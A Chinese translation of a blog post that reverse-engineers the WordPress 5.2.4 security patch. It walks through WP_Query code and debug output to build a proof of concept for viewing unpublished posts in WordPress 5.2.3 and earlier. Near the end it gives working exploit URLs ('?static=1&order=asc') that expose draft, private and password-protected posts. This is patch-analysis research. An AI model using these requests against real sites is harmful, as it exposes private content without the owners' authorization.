> 原文链接: https://www.anquanke.com//post/id/190111 


# WordPress &lt;=5.2.3：如何查看未授权文章


                                阅读量   
                                **961265**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者0day，文章来源：0day.work
                                <br>原文地址：[https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/)

译文仅供参考，具体内容表达以及含义原文为准

# 

[![](https://p5.ssl.qhimg.com/t0106d0a3cf7433f326.png)](https://p5.ssl.qhimg.com/t0106d0a3cf7433f326.png)



## 0x00 前言

几天之前，WordPress发布了[5.2.4](https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/)版本，其中包含一些安全更新，修复了查看未授权文章（post）的漏洞，该漏洞最早由J.D. Grimes发现并公布。我对该漏洞比较感兴趣，但并没有找到公开的PoC，因此我决定逆向分析一下已公开的补丁。



## 0x01 信息收集

由于我找不到任何PoC，因此首先我想尽可能多地收集与该漏洞相关的信息。我对比了来自不同安全厂商的声明，大部分厂商都引用了相同的一句话：“可能（利用该漏洞）查看未授权文章”，如下所示：
- [https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html](https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html)
- [https://blog.wpsec.com/wordpress-5-2-4-security-release/](https://blog.wpsec.com/wordpress-5-2-4-security-release/)
- [https://www.reddit.com/r/netsec/comments/di9kf2/wordpress_524_security_release_breakdown/f3vbuyh/](https://www.reddit.com/r/netsec/comments/di9kf2/wordpress_524_security_release_breakdown/f3vbuyh/)
- …
根据这些信息，我在WordPress SVN仓库/[Github镜像仓库](https://github.com/WordPress/WordPress)中，选择`5.2-branch`分支，然后分析最近的[commits](https://github.com/WordPress/WordPress/commits/5.2-branch)，查找提到了`unauthenticated posts`或者`viewing posts`的相关commit。根据这种方式，我找到了[Commit f82ed753cf00329a5e41f2cb6dc521085136f308](https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308)。



## 0x02 分析补丁

这个commit只修改了两行代码，移除了`static`关键词，修改了部分`if`条件语句。

[![](https://p2.ssl.qhimg.com/t01f796773e23df7e4d.png)](https://p2.ssl.qhimg.com/t01f796773e23df7e4d.png)

根据我的猜想，被删除的`static`检查在这个绕过漏洞中扮演关键角色。`wp-includes/class-wp-query.php`在第731行代码开始涉及到`parse_query`函数，该函数可以过滤并解析传入的所有查询参数（`$_GET`）。

从第696行到第922行，我们可以看到长达125行的条件代码块，代码会根据给定的参数来设置`$this-&gt;is_single`、`$this-&gt;is_attachment`或者`$this-&gt;is_page`。这些条件分支都基于`elseif`，只有一个分支值得研究，如下所示：

```
// If year, month, day, hour, minute, and second are set, a single
            // post is being queried.
        `}` elseif ( '' != $qv['static'] || '' != $qv['pagename'] || ! empty( $qv['page_id'] ) ) `{`
            $this-&gt;is_page   = true;
            $this-&gt;is_single = false;
        `}` else `{`
        // Look for archive queries. Dates, categories, authors, search, post type archives.
```

因此，我们肯定不希望设置像`attachment`、`name`、`p`或者`hour`之类的参数，这些参数可以跳过代码分支。我们不能设置`pagename`或者`page_id`，因为我们不知道这些参数值，并且（或者）这些参数只会返回一个结果，导致访问控制检查失效。

相反，我们需要在参数列表中使用`static=1`。这里我花了数个小时来理解并熟悉WordPress代码及相关函数功能。

最终我找到了`get_posts()`函数，该函数可以使用（已解析的）参数来查询数据库。

```
public function get_posts() `{`
        global $wpdb;

        $this-&gt;parse_query();
        [..]
```

在多个位置使用`var_dump`调试技术后，我最终找到了如下代码段：

```
// Check post status to determine if post should be displayed.
        if ( ! empty( $this-&gt;posts ) &amp;&amp; ( $this-&gt;is_single || $this-&gt;is_page ) ) `{`
            $status = get_post_status( $this-&gt;posts[0] );
            if ( 'attachment' === $this-&gt;posts[0]-&gt;post_type &amp;&amp; 0 === (int) $this-&gt;posts[0]-&gt;post_parent ) `{`
                $this-&gt;is_page       = false;
                $this-&gt;is_single     = true;
                $this-&gt;is_attachment = true;
            `}`
            $post_status_obj = get_post_status_object( $status );

            //PoC: Let's see what we have
            //var_dump($q_status);
            //var_dump($post_status_obj);
            // If the post_status was specifically requested, let it pass through.
            if ( ! $post_status_obj-&gt;public &amp;&amp; ! in_array( $status, $q_status ) ) `{`
                //var_dump("PoC: Incorrect status! :-/");
                if ( ! is_user_logged_in() ) `{`
                    // User must be logged in to view unpublished posts.
                    $this-&gt;posts = array();
                    //var_dump("PoC: No posts :-(");
                `}` else `{`
                    if ( $post_status_obj-&gt;protected ) `{`
                        // User must have edit permissions on the draft to preview.
                        if ( ! current_user_can( $edit_cap, $this-&gt;posts[0]-&gt;ID ) ) `{`
                            $this-&gt;posts = array();
                        `}` else `{`
                            $this-&gt;is_preview = true;
                            if ( 'future' != $status ) `{`
                                $this-&gt;posts[0]-&gt;post_date = current_time( 'mysql' );
                            `}`
                        `}`
                    `}` elseif ( $post_status_obj-&gt;private ) `{`
                        if ( ! current_user_can( $read_cap, $this-&gt;posts[0]-&gt;ID ) ) `{`
                            $this-&gt;posts = array();
                        `}`
                    `}` else `{`
                        $this-&gt;posts = array();
                    `}`
                `}`
            `}`
```

由于除了`static=1`之外，我们并没有设置任何特定的查询参数，因此在`$this-&gt;posts = $wpdb-&gt;get_results($this-&gt;request);`之前的SQL查询语句为`var_dump($this-&gt;request);`，具体如下：

```
string(112) "SELECT   wp_posts.* FROM wp_posts  WHERE 1=1  AND wp_posts.post_type = 'page'  ORDER BY wp_posts.post_date DESC "

```

该语句可以返回数据库中的所有页面（包括`password protected`、`pending`及`drafts`类别的页面）。因此，`! empty( $this-&gt;posts ) &amp;&amp; ( $this-&gt;is_single || $this-&gt;is_page )`对应的值为`true`。

该函数随后会检查**第一**篇文章的状态（`$status = get_post_status( $this-&gt;posts[0] );`）：

```
if ( ! $post_status_obj-&gt;public &amp;&amp; ! in_array( $status, $q_status ) ) `{`
```

如果第一篇文章的状态不是`public`，则将进一步执行访问控制检查。比如，当用户未经授权时，代码将会清空`$this-&gt;posts`。



## 0x03 漏洞利用

因此，利用方式也非常直接：我们可以控制查询流程，使第一篇文章的状态为`published`，但返回数组中包含多篇文章。

为了演示这个过程，我们需要创建一些页面：
- 一个处于已发布状态的页面
- 一个处于草稿状态的页面
这里我使用的是页面，因为`post_type='page'`是WordPress的默认设置，但如果有需要，我们可以设置`&amp;post_type=post`，这样就能修改文章类型，变成`post_type = 'post'`。

[![](https://p4.ssl.qhimg.com/t01471f56beb48bc6ab.png)](https://p4.ssl.qhimg.com/t01471f56beb48bc6ab.png)

目前我们知道如果在WordPress的URL添加`?static=1`，应该能查看网站的隐私内容。在访问控制检查之前添加`var_dump($this-&gt;posts);`，我们可以看到`http://wordpress.local/?static=1`这个URL会返回如下页面：

```
array(2) `{`
  [0]=&gt;
  object(WP_Post)#763 (24) `{`
    ["ID"]=&gt;
    int(43)
    ["post_author"]=&gt;
    string(1) "1"
    ["post_date"]=&gt;
    string(19) "2019-10-20 03:55:29"
    ["post_date_gmt"]=&gt;
    string(19) "0000-00-00 00:00:00"
    ["post_content"]=&gt;
    string(79) "&lt;!-- wp:paragraph --&gt;
&lt;p&gt;A draft with secret content&lt;/p&gt;
&lt;!-- /wp:paragraph --&gt;"
    ["post_title"]=&gt;
    string(7) "A draft"
    ["post_excerpt"]=&gt;
    string(0) ""
    ["post_status"]=&gt;
    string(5) "draft"
    ["comment_status"]=&gt;
    string(6) "closed"
    ["ping_status"]=&gt;
    string(6) "closed"
    ["post_password"]=&gt;
    string(0) ""
    ["post_name"]=&gt;
    string(0) ""
    ["to_ping"]=&gt;
    string(0) ""
    ["pinged"]=&gt;
    string(0) ""
    ["post_modified"]=&gt;
    string(19) "2019-10-20 03:55:29"
    ["post_modified_gmt"]=&gt;
    string(19) "2019-10-20 03:55:29"
    ["post_content_filtered"]=&gt;
    string(0) ""
    ["post_parent"]=&gt;
    int(0)
    ["guid"]=&gt;
    string(34) "http://wordpress.local/?page_id=43"
    ["menu_order"]=&gt;
    int(0)
    ["post_type"]=&gt;
    string(4) "page"
    ["post_mime_type"]=&gt;
    string(0) ""
    ["comment_count"]=&gt;
    string(1) "0"
    ["filter"]=&gt;
    string(3) "raw"
  `}`
  [1]=&gt;
  object(WP_Post)#764 (24) `{`
    ["ID"]=&gt;
    int(41)
    ["post_author"]=&gt;
    string(1) "1"
    ["post_date"]=&gt;
    string(19) "2019-10-20 03:54:50"
    ["post_date_gmt"]=&gt;
    string(19) "2019-10-20 03:54:50"
    ["post_content"]=&gt;
    string(66) "&lt;!-- wp:paragraph --&gt;
&lt;p&gt;Public content&lt;/p&gt;
&lt;!-- /wp:paragraph --&gt;"
    ["post_title"]=&gt;
    string(13) "A public page"
    ["post_excerpt"]=&gt;
    string(0) ""
    ["post_status"]=&gt;
    string(7) "publish"
    ["comment_status"]=&gt;
    string(6) "closed"
    ["ping_status"]=&gt;
    string(6) "closed"
    ["post_password"]=&gt;
    string(0) ""
    ["post_name"]=&gt;
    string(13) "a-public-page"
    ["to_ping"]=&gt;
    string(0) ""
    ["pinged"]=&gt;
    string(0) ""
    ["post_modified"]=&gt;
    string(19) "2019-10-20 03:55:10"
    ["post_modified_gmt"]=&gt;
    string(19) "2019-10-20 03:55:10"
    ["post_content_filtered"]=&gt;
    string(0) ""
    ["post_parent"]=&gt;
    int(0)
    ["guid"]=&gt;
    string(34) "http://wordpress.local/?page_id=41"
    ["menu_order"]=&gt;
    int(0)
    ["post_type"]=&gt;
    string(4) "page"
    ["post_mime_type"]=&gt;
    string(0) ""
    ["comment_count"]=&gt;
    string(1) "0"
    ["filter"]=&gt;
    string(3) "raw"
  `}`
`}`
```

如上所示，数组中的第一个页面为草稿页面（`["post_status"]=&gt;string(5) "draft"`），因此我们看不到任何内容：

[![](https://p4.ssl.qhimg.com/t01b558e667513e27bb.png)](https://p4.ssl.qhimg.com/t01b558e667513e27bb.png)

然而，我们可以使用一些方法来控制返回的内容：
- 使用`asc`或者`desc`执行`order`排序
- `orderby`
<li>使用`m=YYYY`、`m=YYYYMM`或者`m=YYYYMMDD`日期格式的`m`
</li>
- …
在这种测试场景中，我们只要简单颠倒返回的元素顺序即可，此时访问`http://wordpress.local/?static=1&amp;order=asc`，我们就可以查看到隐私内容：

[![](https://p1.ssl.qhimg.com/t017f276616ceeec808.png)](https://p1.ssl.qhimg.com/t017f276616ceeec808.png)

我们也可以利用该漏洞查看`password protected`以及`private`状态的文章：

[![](https://p2.ssl.qhimg.com/t014c103936b0588977.png)](https://p2.ssl.qhimg.com/t014c103936b0588977.png)
